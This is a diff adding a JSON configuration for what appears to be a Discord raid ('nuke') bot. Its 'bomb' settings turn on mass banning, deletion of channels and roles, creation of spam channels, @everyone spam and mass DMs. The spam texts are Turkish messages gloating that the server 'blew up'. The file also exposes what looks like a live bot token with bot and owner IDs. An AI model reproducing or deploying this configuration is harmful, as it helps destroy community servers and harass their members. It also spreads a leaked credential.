@@ -1,0 +1,23 @@
+{
+    "prefix": ".",
+    "botid": "1079055025160077352",
+    "token": "MTA3OTA1NTAyNTE2MDA3NzM1Mg.G-UTF6.ag3rneKi7poCymDV2_nis4wPnA6H3ki6W7RsEo",
+    "owner": "1071789370689998868",
+
+    "bomb": {
+        "roles": ["Burası", "Uçtu", "xD"],
+        "spamChannelText": "Sunucunuz uçtu arkadaşlar xD @everyone",
+        "channelNames": ["Bir sunucu ", "Daha", "Temizlendi","Bir sunucu ", "Daha", "Temizlendi","Bir sunucu ", "Daha", "Temizlendi","Bir sunucu ", "Daha", "Temizlendi","Bir sunucu ", "Daha", "Temizlendi","Bir sunucu ", "Daha", "Temizlendi","Bir sunucu ", "Daha", "Temizlendi","Bir sunucu ", "Daha", "Temizlendi","Bir sunucu ", "Daha", "Temizlendi","Bir sunucu ", "Daha", "Temizlendi","Bir sunucu ", "Daha", "Temizlendi","Bir sunucu ", "Daha", "Temizlendi","Bir sunucu ", "Daha", "Temizlendi","Bir sunucu ", "Daha", "Temizlendi","Bir sunucu ", "Daha", "Temizlendi","Bir sunucu ", "Daha", "Temizlendi","Bir sunucu ", "Daha", "Temizlendi","Bir sunucu ", "Daha", "Temizlendi","Bir sunucu ", "Daha", "Temizlendi"],
+        "dmText": "Bulunduğunuz sunucu patlatılmıştır xD"
+    },
+
+    "advancedSettings": {
+        "ban": true,
+        "dm": true,
+        "channelDelete": true,
+        "channelCreate": true,
+        "roleDelete": true,
+        "roleCreate": true,
+        "channelSpam": true
+    }
+}
